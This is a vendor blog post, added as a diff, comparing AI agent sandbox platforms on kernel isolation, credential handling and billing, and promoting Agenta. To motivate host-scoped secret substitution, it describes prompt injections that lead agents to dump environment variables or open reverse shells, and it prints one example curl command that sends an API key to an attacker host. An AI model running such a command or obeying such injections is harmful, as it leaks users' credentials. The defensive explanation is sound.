@@ -1,0 +1,269 @@
+---
+slug: ai-agent-sandboxes-compared
+title: "AI Agent Sandboxes Compared: Daytona vs. E2B vs. Modal vs. Kubernetes for Company AI Platforms"
+description: "A technical comparison of Daytona, E2B, Modal, Cloudflare Sandboxes, Fly.io Sprites, and Kubernetes agent-sandbox on isolation, secret security, and cost."
+category: Engineering
+date: 2026-11-01
+author: mahmoud-mabrouk
+heroImage: /blog/ai-agent-sandboxes-compared/hero.webp
+ogImage: /blog/ai-agent-sandboxes-compared/hero.webp
+readingTime: 14 min read
+tags:
+  - AI Coworker
+  - Company Brain
+  - Open Source
+  - AI Engineering
+  - Enterprise AI
+faq:
+  - question: "What is the difference between Firecracker microVMs, gVisor, and container sandboxes for AI agents?"
+    answer: "Firecracker microVMs (used by E2B, Fly.io Sprites, and Cloudflare Containers) boot a dedicated guest Linux kernel per sandbox so untrusted code never shares a host kernel. Google's gVisor (used by Modal Sandboxes and optional on Kubernetes) intercepts guest application syscalls in a memory-safe userspace kernel without full hardware virtualization overhead. Hardened containers (used by Daytona by default, with optional VM classes) isolate filesystems, process trees, and network namespaces on a shared kernel to achieve sub-90ms instantiation from snapshots."
+  - question: "How do you stop an AI agent inside a sandbox from leaking API keys?"
+    answer: "Kernel isolation alone does not prevent credential exfiltration if raw API keys sit inside the sandbox environment variables. In an open-source AI coworker platform like Agenta running on Daytona sandboxes, the runner never places raw model API keys or HTTP MCP server headers inside the sandbox. Instead, each key is stored as a host-scoped Daytona Secret, the sandbox receives an opaque placeholder, and the real credential is substituted only on outbound HTTPS requests to that single authorized hostname."
+  - question: "Which AI agent sandbox is most cost-effective when agents spend most of their time waiting on LLM calls?"
+    answer: "Coding and operations agents typically spend 70% to 85% of wall-clock session time waiting on model responses or human approval cards. Providers that meter active CPU or actual resource consumption (such as Fly.io Sprites at $0.0385 per active CPU-hour and Cloudflare Sandboxes at $0.072 per active vCPU-hour) cost less during idle-heavy sessions than wall-clock reserved providers, whereas Daytona ($0.0504/vCPU-hr with $0 platform fee and disk-only billing when stopped) is highly predictable when sandboxes are stopped immediately between turns."
+  - question: "When should a platform team use kubernetes-sigs/agent-sandbox instead of a managed sandbox cloud?"
+    answer: "Choose kubernetes-sigs/agent-sandbox when strict VPC data residency, private cloud peering, or zero third-party subprocessor mandates require every agent workload to stay inside your own AWS EKS, Google GKE, or bare-metal cluster. Pair the Sandbox and SandboxWarmPool CRDs with a gVisor or Kata Containers RuntimeClass so pre-warmed pods can be claimed in under a second without exposing the host node kernel."
+  - question: "How does Agenta use sandboxes to run company-wide AI coworkers?"
+    answer: "Agenta separates the execution substrate from the coworker layer. Platform engineers configure Daytona cloud sandboxes (or local runner sandboxes on trusted self-hosted deployments), CIDR network allowlists, host-scoped secret substitution, and coding-grade harnesses (Claude Code, Codex, and Pi). Domain teams across product, support, marketing, sales, finance, and operations then build and customize coworkers in plain language via chat, backed by persistent shared agent files and action-level human approvals."
+---
+
+Every coding-grade AI agent eventually needs a computer of its own. The moment an agent moves beyond simple chat completion to running bash scripts, analyzing CSVs with Python, cloning Git repositories, or driving a headless browser through harnesses like [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview), [Codex](https://github.com/openai/codex), or [Pi](https://agenta.ai/docs/concepts/harnesses-and-models), executing that loop inside your main application container becomes a critical security liability.
+
+A single prompt injection hidden in a support ticket, dependency README, or scraped web page can instruct an unisolated agent to read another customer's session files, inspect `process.env`, or open a reverse shell into your internal network.
+
+To prevent that, platform teams isolate every agent execution inside a dedicated sandbox. Over the past year, the market for AI agent sandboxes has split into three distinct approaches:
+
+1. **Managed sandbox clouds** purpose-built for fast microVM or container instantiation ([Daytona](https://www.daytona.io/) and [E2B](https://e2b.dev/)).
+2. **Serverless and edge compute platforms** that added sandbox primitives ([Modal Sandboxes](https://modal.com/docs/guide/sandbox), [Cloudflare Sandboxes](https://developers.cloudflare.com/sandbox/), and [Fly.io Sprites](https://fly.io/learn/ai-sandbox-pricing/)).
+3. **Self-hosted Kubernetes operators** such as [kubernetes-sigs/agent-sandbox](https://github.com/kubernetes-sigs/agent-sandbox) paired with `gVisor` or `Kata Containers`.
+
+If you are a CTO or VP of Engineering building an [internal AI agent platform](/blog/internal-ai-agent-platform-build-vs-buy) or a [company AI brain](/blog/how-to-build-a-company-ai-brain), raw boot-time marketing benchmarks will not tell you which sandbox fits your architecture. You need to know how each runtime isolates untrusted processes, how credentials stay hidden from the sandbox environment, what happens to your bill while an agent waits on LLM calls or human approvals, and how the sandbox connects to shared company memory.
+
+## TL;DR: AI agent sandboxes and platforms compared
+
+| Platform / Runtime                                                                   | Isolation Boundary                                                          | Compute Billing Model                                                | Best Fit                                                             |
+| :----------------------------------------------------------------------------------- | :-------------------------------------------------------------------------- | :------------------------------------------------------------------- | :------------------------------------------------------------------- |
+| **[Agenta](https://agenta.ai)**                                                      | Orchestrates **Daytona** cloud sandboxes or **local** self-hosted sandboxes | Open-source (MIT) or Cloud; host-scoped secret substitution          | Full company AI brain and multi-user AI coworker platform            |
+| **[Daytona](https://www.daytona.io/)**                                               | Hardened container default; optional VM, Windows, and GPU classes           | `$0.0504/vCPU-hr` + `$0.0162/GiB-hr` reserved (`$0` plan fee)        | Sub-90ms snapshots and outbound host-scoped secret substitution      |
+| **[E2B](https://e2b.dev/)**                                                          | Firecracker microVM per sandbox (dedicated guest kernel)                    | `$0.0504/vCPU-hr` + `$0.0162/GiB-hr` + `$150/mo` Pro plan            | Untrusted multi-tenant code execution with full RAM pause/resume     |
+| **[Modal Sandboxes](https://modal.com/)**                                            | Google `gVisor` userspace kernel (optional VM runtime)                      | `$0.1419/core-hr` (2 vCPU) + `$0.024/GiB-hr` (`$30/mo` free credit)  | Serverless GPU sandboxes (T4 to B200) and bursty Python workloads    |
+| **[Cloudflare Sandboxes](https://developers.cloudflare.com/sandbox/)**               | MicroVM Containers or V8 Dynamic Workers via Durable Objects                | `$0.072/vCPU-hr` active CPU + `$0.009/GiB-hr` (`$5/mo` Workers Paid) | Teams already building edge apps on Cloudflare Workers and R2        |
+| **[Fly.io Sprites](https://fly.io/learn/ai-sandbox-pricing/)**                       | Firecracker microVMs on bare metal with ~30s auto-sleep                     | `$0.0385/CPU-hr` used + `$0.021875/GB-hr` used (`$0` idle compute)   | Long-lived coding sessions with 100 GB persistent copy-on-write disk |
+| **[Kubernetes (`agent-sandbox`)](https://github.com/kubernetes-sigs/agent-sandbox)** | Kubernetes Pod with `RuntimeClass` (`gVisor` or `Kata Containers`)          | Your own EKS, GKE, or bare-metal node cost (`$0` vendor markup)      | Strict VPC data residency and BYOC platform engineering teams        |
+
+## The 4 architectural dimensions that actually separate agent sandboxes
+
+Before comparing individual vendors, platform engineers should evaluate four structural tradeoffs that determine security posture and unit economics in production.
+
+![Architecture diagram comparing AI agent sandbox kernel isolation models and host-scoped secret substitution](/blog/ai-agent-sandboxes-compared/sandbox-isolation-and-secret-boundary.webp)
+
+### 1. Kernel isolation: MicroVMs vs. gVisor vs. hardened containers
+
+Vendor marketing often treats "sandbox" as a single binary property, but production runtimes rely on three distinct kernel boundaries:
+
+- **Hardware-virtualized microVMs (Firecracker, Cloud Hypervisor, Kata Containers):** Used by E2B, Cloudflare Containers, Fly.io Sprites, and Kubernetes clusters running Kata. Every sandbox boots its own minimal guest Linux kernel inside a lightweight KVM virtual machine. If untrusted code triggers a kernel exploit inside the sandbox, the blast radius stops at the guest VM boundary.
+- **Userspace kernel interception (`gVisor`):** Used by Modal Sandboxes and GKE Agent Sandboxes. Instead of passing system calls directly to the host Linux kernel, Google's `runsc` runtime intercepts application syscalls in a memory-safe userspace kernel written in Go. It delivers strong syscall isolation and fast container startup, though exotic Linux syscalls occasionally differ from bare-metal behavior.
+- **Hardened snapshot containers (with optional VM classes):** Used by Daytona by default (with dedicated VM, Windows, and GPU classes available when needed). Isolating each session with Linux namespaces, cgroups, and pre-built filesystem snapshots enables sub-90ms instantiation and fast file mounts for trusted internal company coworkers, while high-risk workloads can step up to dedicated VM classes.
+
+### 2. The credential trap: Why `process.env` inside a sandbox is broken
+
+Most engineering teams obsess over kernel escapes while leaving a much wider door open: **putting raw API keys inside the sandbox environment.**
+
+An AI agent is not static application code. It writes and runs scripts, installs third-party packages from npm or PyPI, and processes untrusted external text. If the LLM provider API key or an HTTP [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) bearer token sits inside the sandbox as a standard environment variable, any prompt injection that convinces the agent to run `env` or `curl https://attacker.example -d "$OPENAI_API_KEY"` immediately compromises your credentials. No microVM hypervisor will stop an authorized process from reading its own environment variables.
+
+Solving this requires **host-scoped secret substitution** outside the sandbox boundary:
+
+1. **Store the real credential outside the sandbox** in a host-scoped secret store tied to the single HTTPS hostname that credential authenticates against (for example, `api.anthropic.com` or your internal MCP gateway host).
+2. **Inject only an opaque placeholder** into the sandbox environment variables.
+3. **Substitute the real value at the network boundary** only when an outbound HTTPS request from the sandbox targets that exact authorized hostname.
+
+If a prompt injection tells the agent to print its environment variables in chat, or if a compromised dependency posts the environment to an external server, the attacker receives only the useless placeholder. Combine host-scoped secret substitution with strict outbound CIDR allowlists (`network.mode: "allowlist"` and `enforcement: "strict"`) so any unauthorized network hop fails closed.
+
+### 3. Billing models under real agent utilization (25% busy vs. 100% busy)
+
+Headline CPU rates across sandbox vendors look deceptively similar until you model how AI agents actually behave. A coding or operations coworker spends 70% to 85% of its session waiting: waiting on LLM token generation, waiting on external API responses, or waiting on a human teammate to approve a write action in Slack or web chat.
+
+Providers meter that waiting time in three different ways:
+
+- **Wall-clock reserved billing (Daytona, E2B, Modal):** You pay for the vCPUs and RAM reserved for every second the sandbox is running, whether the CPU is at 0% or 100% utilization. Stopping or pausing the sandbox immediately halts compute billing.
+- **Active CPU plus provisioned memory (Cloudflare Sandboxes):** The CPU meter ticks only while a process actively executes instructions on the CPU (excluding network and LLM I/O wait), while memory is billed for the container's provisioned shape while awake.
+- **Actual resource usage with rapid sleep (Fly.io Sprites):** CPU is billed on cumulative CPU seconds actually consumed (`cpu.stat`), memory is billed on actual RAM used, and the microVM automatically sleeps after roughly 30 seconds of inactivity.
+
+Here is how those billing models compare for a standard **2 vCPU, 4 GiB RAM** coding-agent sandbox across 100 running sandbox-hours, alongside each provider's required production plan floor:
+
+| Sandbox Provider                 | Hourly Rate (25% CPU Busy)              | 100 Sandbox-Hours (25% vs. 100% Busy)  | Production Plan Floor                                |
+| :------------------------------- | :-------------------------------------- | :------------------------------------- | :--------------------------------------------------- |
+| **Daytona**                      | `$0.166 / hr` (reserved while up)       | `$16.56` (25%) / `$16.56` (100%)       | `$0 / mo` (`$200` starter credit included)           |
+| **E2B**                          | `$0.166 / hr` (reserved while up)       | `$16.56` (25%) / `$16.56` (100%)       | `$150 / mo` Pro (for 24h cap & 100 concurrent)       |
+| **Modal Sandboxes**              | `$0.238 / hr` (1 core / 2 vCPU eq.)     | `$23.79` (25%) / `$23.79` (100%)       | `$0 / mo` Starter (`$30` credit) or `$250 / mo` Team |
+| **Cloudflare Sandboxes**         | `$0.112 / hr` (`standard-3` active CPU) | `$11.20` (25%) / `$22.00` (100%)       | `$5 / mo` Workers Paid plan                          |
+| **Fly.io Sprites**               | `$0.052 / hr` (25% CPU, 1.5 GB used)    | `$5.21` (25%) / `$16.45` (100%)        | `$0 / mo` pay-as-you-go (`$100 / mo` Hero optional)  |
+| **Kubernetes (`agent-sandbox`)** | Underlying cloud node cost              | Underlying cloud node cost + warm pool | `$0` license (Apache-2.0); engineering ops cost      |
+
+Notice two practical takeaways from the math:
+
+1. **At moderate concurrency, plan floors outweigh raw per-second rates.** Running 30 concurrent sandboxes for 200 total hours a month costs `$33.12` in raw compute on both Daytona and E2B, but E2B requires the `$150/month` Pro plan once you exceed Hobby's 20-sandbox concurrency cap or 1-hour session limit.
+2. **Lifecycle automation beats micro-optimizing CPU rates.** If your platform automatically stops or pauses a Daytona or E2B sandbox between turns, wall-clock billing drops to zero during human think time.
+
+### 4. State persistence vs. shared organizational memory
+
+Every sandbox provider offers some form of disk or memory snapshot (`fork()` and RAM pause on E2B, fast container snapshots on Daytona, filesystem snapshots on Modal, R2 directory backups on Cloudflare, and 100 GB persistent volumes on Fly Sprites).
+
+However, a **sandbox filesystem snapshot is not a company AI brain.** If a support, finance, or marketing coworker learns a durable workflow rule or saves an updated playbook inside its private sandbox disk, other sessions and other coworkers cannot read it when that sandbox terminates. Production company AI platforms mount a **two-tier storage layout** into every sandbox:
+
+- **A temporary session working directory** for scratch scripts, git clones, and intermediate builds that disappear when the session ends.
+- **[Persistent shared agent files](https://agenta.ai/docs/concepts/files-and-knowledge) (`AI Drive`)** mounted from durable storage so verified reports, playbooks, and learned company context survive across sessions without polluting ephemeral workspaces.
+
+---
+
+## 1. Agenta: Best open-source AI coworker platform with governed sandbox execution
+
+![Agenta open-source AI coworker platform workspace](/blog/ai-agent-sandboxes-compared/agenta.webp)
+
+A sandbox provider gives your engineers an API to boot a Linux machine, but it does not give your company a working AI platform. [Agenta](https://agenta.ai) is an [open-source AI coworker platform](https://agenta.ai) (released under the [MIT License](https://opensource.org/license/mit)) that provides the complete company AI brain, multi-harness runtime, and governance layer on top of isolated sandboxes.
+
+Instead of forcing platform engineers to stitch together sandbox SDKs, credential proxies, file-sync daemons, approval UIs, and Slack bots from scratch, Agenta cleanly separates the [platform engineering substrate from domain builder workflows](/blog/company-ai-platform-ownership-model).
+
+### How Agenta governs sandboxes, credentials, and harnesses
+
+- **Pluggable sandbox providers (`daytona` and `local`):** Platform engineers configure enabled sandbox providers via `AGENTA_RUNNER_ENABLED_SANDBOX_PROVIDERS` (see [Sandboxes and security](https://agenta.ai/docs/reference/agents/sandboxes-and-security)). In multi-user deployments and Agenta Cloud, every agent session executes inside its own isolated **Daytona** cloud sandbox with its own filesystem, process tree, and network boundary. On single-team self-hosted deployments ([Docker Compose](https://docs.docker.com/compose/) or [Kubernetes Helm](https://helm.sh/)), operators can also enable `local` runner sandboxes when keys and personal harness subscriptions must never leave the internal cluster.
+- **Host-scoped secret substitution by default:** When an agent runs in a Daytona sandbox, Agenta [hides API keys from the agent sandbox](https://agenta.ai/docs/changelog/api-keys-hidden-from-agent-sandboxes) so raw model provider API keys or HTTP MCP server headers never enter the sandbox environment. The runner registers each secret with Daytona restricted to the single HTTPS hostname that credential authenticates against, places an opaque placeholder inside the sandbox, and substitutes the real secret on outbound HTTPS requests to that host. If an agent is tricked into printing its environment variables or sending them to an external URL, only the placeholder is exposed.
+- **Three layers of permission enforcement:** Platform and domain teams enforce boundaries across three independent layers:
+  1. `sandbox.permissions`: Outbound `network.mode` (`on`, `off`, or `allowlist` restricted to explicit CIDR blocks) and `enforcement: "strict"` so runs fail closed if a network boundary cannot be applied.
+  2. `runner.permissions`: Per-tool execution policies (`allow`, `ask`, `deny`, and `allow_reads` / "Ask for write and delete"; see [Control what an agent can do](https://agenta.ai/docs/guides/control-what-an-agent-can-do)) so read queries run automatically while external writes pause for an interactive human approval card.
+  3. `harness.permissions`: Built-in controls across coding-grade harnesses including [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview), [Codex](https://github.com/openai/codex) ([Agenta Codex harness](https://agenta.ai/docs/changelog/codex-harness)), and [Pi](https://agenta.ai/docs/concepts/harnesses-and-models).
+- **Two-tier workspace storage and plain-language coworker building:** Every sandbox mounts both a temporary session working directory and [persistent shared agent files](https://agenta.ai/docs/concepts/files-and-knowledge). Non-technical and semi-technical domain experts in product, support, marketing, sales, finance, and operations build and refine coworkers in plain language via chat, test them privately, and publish them across the web workspace, [Slack](https://agenta.ai/docs/guides/connect-slack), Telegram, or an [embeddable web chat widget (`Publish > Embed`)](https://agenta.ai/docs/guides/embed-an-agent) with full [Role-Based Access Control (RBAC)](https://agenta.ai/docs/administration/access-control/rbac) and [OpenTelemetry](https://opentelemetry.io/) tracing.
+
+---
+
+## 2. Daytona: Best sandbox runtime for sub-90ms cold starts and outbound secret substitution
+
+![Daytona AI agent sandbox platform](/blog/ai-agent-sandboxes-compared/daytona.webp)
+
+[Daytona](https://www.daytona.io/) has become one of the default sandbox substrates for production AI agent platforms (and is the cloud sandbox provider integrated into Agenta). Originally built for cloud development environments, Daytona pivoted its runtime specifically around millisecond sandbox instantiation, declarative image snapshots, and credential-safe agent execution.
+
+### Architecture and strengths
+
+- **Sub-90ms creation from pre-built snapshots:** Daytona defaults to hardened container isolation backed by pre-warmed image snapshots, launching a ready-to-execute Linux workspace in under 90 milliseconds. When workloads require deeper hardware boundaries or specialized operating systems, Daytona also offers dedicated VM classes, Windows VMs (`$0.0858/vCPU-hr`), and on-demand or preemptible GPUs (from Nvidia RTX 4090 at `$0.57/hr` to H100 and B200).
+- **Host-scoped Daytona Secrets:** Daytona's Secrets API allows an orchestrator (such as Agenta's runner) to bind a secret to a specific target hostname rather than passing plaintext keys into the container environment. Outbound HTTPS calls to the matching hostname have the secret injected in transit, neutralizing `env`-dump prompt injections.
+- **Built-in agent tooling APIs:** Each sandbox exposes programmatic endpoints for Git operations, Language Server Protocol (LSP) inspection, PTY terminal streams, SSH, VNC/Computer Use desktops, and CIDR/domain egress allowlists.
+- **Zero monthly platform fee:** Unlike providers that gate production concurrency behind a `$150` or `$250` monthly tier, Daytona bills purely per second on reserved resources (`$0.0504/vCPU-hr`, `$0.0162/GiB-hr` RAM, and `$0.000108/GiB-hr` storage after 5 GiB free) with `$200` in free starter compute credits. Stopped sandboxes bill only for reserved disk, and archived sandboxes bill `$0`.
+
+### Tradeoffs to keep in mind
+
+- **Wall-clock compute billing while running:** While a sandbox is in the `running` state, you pay for its reserved vCPUs and RAM even while the agent is waiting on an LLM call. Your orchestrator should stop or archive sandboxes promptly when a session turn completes.
+- **Container default vs. microVM default:** If your compliance policy mandates a separate guest Linux kernel per untrusted external tenant on every single run, you must explicitly select Daytona's VM class rather than the default container tier.
+
+---
+
+## 3. E2B: Best Firecracker microVM cloud for memory pause/resume and forking
+
+![E2B Firecracker microVM cloud for AI agents](/blog/ai-agent-sandboxes-compared/e2b.webp)
+
+[E2B](https://e2b.dev/) pioneered the dedicated "AI Agent Cloud" category and remains the benchmark for hardware-virtualized Firecracker microVM sandboxes. Every E2B sandbox runs inside its own [Firecracker](https://firecracker-microvm.github.io/) microVM with a dedicated guest kernel, making it a strong choice when external users or untrusted tenants execute arbitrary code.
+
+### Architecture and strengths
+
+- **Firecracker microVM isolation in ~150ms:** E2B boots a microVM from a custom Dockerfile template in roughly 150 milliseconds, giving every agent run its own kernel, network namespace, and root filesystem.
+- **Full memory + filesystem pause, resume, and `fork()`:** Unlike sandboxes that only snapshot disk state, E2B snapshots both the filesystem and live VM memory. You can pause a running sandbox while waiting on a user response (dropping compute cost to `$0` while paused) and resume with running processes and in-memory variables intact, or call `fork()` to clone a warm sandbox into up to 20 parallel branches for tree-of-thought evaluation.
+- **Open-source self-hosting recipes (Apache-2.0):** E2B publishes its core infrastructure under the Apache-2.0 license with Terraform deployment scripts for GCP and AWS (beta), alongside enterprise BYOC support.
+
+### Tradeoffs to keep in mind
+
+- **Production requires the `$150/month` Pro plan:** While E2B's per-second compute rates match Daytona (`$0.000014/vCPU-s` or `$0.0504/vCPU-hr`, plus `$0.0000045/GiB-s` or `$0.0162/GiB-hr`), the free Hobby tier caps sessions at 1 hour and concurrency at 20 sandboxes. Production deployments require the `$150/month` Pro tier (24-hour sessions, 100 concurrent sandboxes expandable to 1,100) or Enterprise (`$2,000/month` minimum commit).
+- **Raw primitive, not a workspace platform:** E2B provides the Python/JS SDK and Code Interpreter runtime, leaving multi-harness orchestration, shared company files, RBAC, and human approval workflows to your platform team.
+
+---
+
+## 4. Modal Sandboxes: Best for serverless GPU agents and bursty scientific workloads
+
+![Modal serverless cloud and GPU sandboxes](/blog/ai-agent-sandboxes-compared/modal.webp)
+
+[Modal](https://modal.com/) built its reputation on instant serverless Python and GPU execution, and **Modal Sandboxes** extend that same container fabric to interactive, dynamically created agent environments.
+
+### Architecture and strengths
+
+- **Instant serverless GPUs inside the sandbox:** If your agents run local embedding models, PyTorch evaluation loops, video/audio processing, or scientific simulations, Modal lets you attach Nvidia T4, L4, A10G, L40S, A100, H100, H200, or B200 GPUs to a sandbox in Python without pre-provisioning node pools.
+- **`gVisor` isolation with tiny minimum footprints:** Modal runs sandboxes inside Google's `gVisor` userspace kernel (with a dedicated VM runtime option) and allows reservations as small as `0.125` physical cores (`0.25` vCPU equivalent) and `128 MiB` of RAM. Sandboxes can burst above their initial reservation and are billed on `max(requested, actual usage)`.
+- **Programmatic image builder and Volumes:** You define sandbox environments directly in Python (`modal.Image.debian_slim().pip_install(...)`), snapshot the filesystem at any checkpoint, and mount shared Modal Volumes (1 TiB free per month) across runs.
+
+### Tradeoffs to keep in mind
+
+- **3x non-preemptible multiplier on Sandbox CPU and RAM:** Because Modal Sandboxes cannot be preempted mid-session like batch Modal Functions, Modal applies a 3x multiplier to its base CPU and memory rates (`$0.00003942/core-s` or `$0.1419/physical core-hr` for 2 vCPUs, and `$0.024/GiB-hr` for memory). A 2 vCPU / 4 GiB sandbox costs `$0.238/hr`, about 43% more per hour than Daytona or E2B.
+- **No in-place memory pause:** Modal Sandboxes cap out at 24 hours and do not pause live RAM in place; resuming a long-lived session requires booting a new sandbox from a saved filesystem snapshot.
+
+---
+
+## 5. Cloudflare Sandboxes: Best for edge Workers and active-CPU billing
+
+![Cloudflare Sandboxes documentation and architecture](/blog/ai-agent-sandboxes-compared/cloudflare-sandboxes.webp)
+
+For teams already running their application tier on Cloudflare Workers, [Cloudflare Sandboxes](https://developers.cloudflare.com/sandbox/) (`@cloudflare/sandbox`) offer two tightly integrated isolation models orchestrated by Durable Objects.
+
+### Architecture and strengths
+
+- **Two isolation tiers under one programming model:**
+  1. **Cloudflare Containers:** Full Linux microVMs with their own kernel and network stack, capable of running bash, Python, Git, and coding harnesses like Claude Code or Codex.
+  2. **Dynamic Workers:** Millisecond-boot V8 isolates created at runtime (`env.LOADER.load()`) for executing untrusted JavaScript, TypeScript, Python, or WebAssembly modules with zero outbound internet access (`globalOutbound: null`).
+- **Active-CPU billing on a `$5/month` plan floor:** Cloudflare Containers charge for CPU only when a process is actively executing (`$0.072/active vCPU-hr` or `$0.000020/vCPU-s`), while memory (`$0.009/GiB-hr`) and disk (`$0.000252/GB-hr`) are billed for the container shape while awake, after the generous monthly allowance included in the `$5/month` Workers Paid plan.
+- **Worker-mediated network perimeter:** External HTTP traffic reaches the sandbox only through your controlling Cloudflare Worker, allowing you to keep credentials inside the Worker and mount Cloudflare R2 buckets for workspace backups.
+
+### Tradeoffs to keep in mind
+
+- **1 to 3 second container cold starts and no RAM snapshots:** Full Linux Containers take 1 to 3 seconds to boot cold, sleep after an idle timeout, and rely on copying directories to R2 rather than instant copy-on-write memory snapshots.
+- **Fixed instance shapes:** Cloudflare Containers are provisioned in fixed shapes (up to 20 GB disk max), and has no GPU instances.
+
+---
+
+## 6. Fly.io Sprites (Fly Machines): Best for persistent microVMs that sleep on idle
+
+![Fly.io AI sandbox pricing and Sprites architecture](/blog/ai-agent-sandboxes-compared/fly-sprites.webp)
+
+[Fly.io](https://fly.io/learn/ai-sandbox-pricing/) offers both general-purpose **Fly Machines** and agent-specific **Sprites**, persistent Firecracker microVMs designed as long-lived "computers for agents" that automatically sleep when idle.
+
+### Architecture and strengths
+
+- **True consumption metering (`cpu.stat` and actual RAM):** Instead of billing for the vCPUs and RAM you allocate, Fly.io Sprites bill only for the CPU cycles (`$0.0385/CPU-hr` actually consumed) and memory (`$0.021875/GB-hr` actually used) your agent draws while awake. For an agent averaging 25% CPU utilization and 1.5 GB of RAM, 100 sandbox-hours cost just `$5.21` in compute.
+- **Auto-sleep in ~30 seconds with 100 GB persistent disk:** When an agent finishes a command and waits for the next user prompt, the Sprite transitions to sleep within roughly 30 seconds, dropping compute billing to `$0` while keeping its 100 GB copy-on-write filesystem intact (`$0.000027/GB-hr` cold storage). On the next request, a warm wake takes 100 to 500 milliseconds.
+
+### Tradeoffs to keep in mind
+
+- **No GPUs and fewer high-level agent SDK helpers:** Fly.io retired its GPU offerings to focus on bare-metal CPU microVMs, and Sprites focus on raw VM lifecycle rather than built-in browser recording or host-scoped secret substitution proxies.
+
+---
+
+## 7. Kubernetes (`kubernetes-sigs/agent-sandbox`): Best for strict VPC and BYOC control
+
+![kubernetes-sigs/agent-sandbox GitHub repository and architecture](/blog/ai-agent-sandboxes-compared/kubernetes-agent-sandbox.webp)
+
+When banking, healthcare, or defense compliance forbids sending code execution to any multi-tenant sandbox cloud, platform engineering teams turn to [kubernetes-sigs/agent-sandbox](https://github.com/kubernetes-sigs/agent-sandbox), the official Kubernetes SIG Apps project (Apache-2.0) for orchestrating stateful, isolated agent pods.
+
+### Architecture and strengths
+
+- **Declarative Kubernetes CRDs (`Sandbox`, `SandboxTemplate`, `SandboxClaim`, `SandboxWarmPool`):** Standard Kubernetes `Deployments` are built for stateless replicas, while `StatefulSets` are cumbersome for thousands of independent singleton agent sessions. `agent-sandbox` introduces a first-class `Sandbox` custom resource with stable hostname identity, PersistentVolumeClaim lifecycle management, pause/resume support, and a `SandboxWarmPool` controller that pre-warms pods so `SandboxClaim` requests bind in sub-second latency.
+- **Pluggable kernel isolation via `RuntimeClass`:** The operator delegates low-level isolation to your cluster's `RuntimeClass`, allowing platform engineers to run every sandbox pod inside Google `gVisor` (`runsc`) or hardware-virtualized `Kata Containers` inside your own AWS EKS, Google GKE, or bare-metal VPC.
+- **Zero vendor markup:** You pay only your cloud provider's underlying node rates and can apply existing enterprise savings plans or committed-use discounts.
+
+### Tradeoffs to keep in mind
+
+- **Significant platform engineering operational load:** Running `kubernetes-sigs/agent-sandbox` in production means your infrastructure team owns `RuntimeClass` node image maintenance, nested virtualization or bare-metal sizing for Kata, warm-pool overprovisioning costs, CNI `NetworkPolicy` egress rules, and building your own outbound secret-injecting proxy so pods do not hold raw API keys.
+
+---
+
+## Decision framework: Which sandbox architecture should you choose?
+
+![Decision matrix for choosing an AI agent sandbox and company AI platform](/blog/ai-agent-sandboxes-compared/agent-sandbox-decision-matrix.webp)
+
+Use these five architectural rules to match your workload to the right stack:
+
+1. **You are building a company-wide AI coworker platform or company AI brain:** Choose **[Agenta](https://agenta.ai)** with **Daytona** cloud sandboxes (or self-hosted `local` / Kubernetes sandboxes). Platform engineering gets sub-90ms Daytona isolation, automatic host-scoped secret substitution (hiding model and MCP keys from the sandbox), CIDR network allowlists, and coding-grade harnesses ([Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview), [Codex](https://github.com/openai/codex), and [Pi](https://agenta.ai/docs/concepts/harnesses-and-models)). Meanwhile, domain teams in support, product, GTM, finance, and ops build and customize coworkers in plain language via chat across web, [Slack](https://agenta.ai/docs/guides/connect-slack), Telegram, and an [embeddable web chat widget](https://agenta.ai/docs/guides/embed-an-agent).
+2. **You are embedding untrusted external user code execution into a SaaS product and need full RAM pause/resume:** Choose **E2B** or **Daytona VM classes**. E2B's Firecracker microVM isolation and memory-plus-filesystem snapshots (`pause()` and `fork()`) excel when external customers run arbitrary code across multi-turn sessions.
+3. **Your agents need on-demand GPUs inside the sandbox:** Choose **Modal Sandboxes** or **Daytona GPU instances**. Modal makes attaching an A100, H100, or B200 to a sandbox a single line of Python with zero idle GPU cluster cost.
+4. **You want persistent per-user Linux machines that sleep automatically between turns at minimal idle cost:** Choose **Fly.io Sprites** or **Cloudflare Sandboxes**. Both avoid charging full wall-clock CPU rates while an agent waits on LLM calls.
+5. **Your security policy mandates 100% in-VPC execution on your own Kubernetes clusters:** Deploy **Agenta self-hosted via [Kubernetes Helm](https://helm.sh/)** or pair your orchestrator with **`kubernetes-sigs/agent-sandbox`** using a `gVisor` or `Kata Containers` `RuntimeClass` and `SandboxWarmPool`.
+
+## Next steps: Run governed AI coworkers without building sandbox plumbing from scratch
+
+Evaluating sandbox runtimes makes one reality obvious: booting an isolated container or microVM is only the first 15% of an internal AI platform. Before a single department can rely on an AI coworker in production, you still need host-scoped secret substitution so prompt injections cannot steal API keys, two-tier storage that separates ephemeral scratch work from [persistent shared agent files](https://agenta.ai/docs/concepts/files-and-knowledge), action-level `allow` / `ask` / `deny` gates, [RBAC](https://agenta.ai/docs/administration/access-control/rbac), and [OpenTelemetry](https://opentelemetry.io/) observability.
+
+With [Agenta](https://agenta.ai), that entire governance and coworker layer is ready out of the box under the [MIT License](https://opensource.org/license/mit). You can start on Agenta Cloud (with isolated Daytona sandboxes and host-scoped secret hiding enabled by default) or self-host via Docker Compose or Kubernetes Helm in under ten minutes.
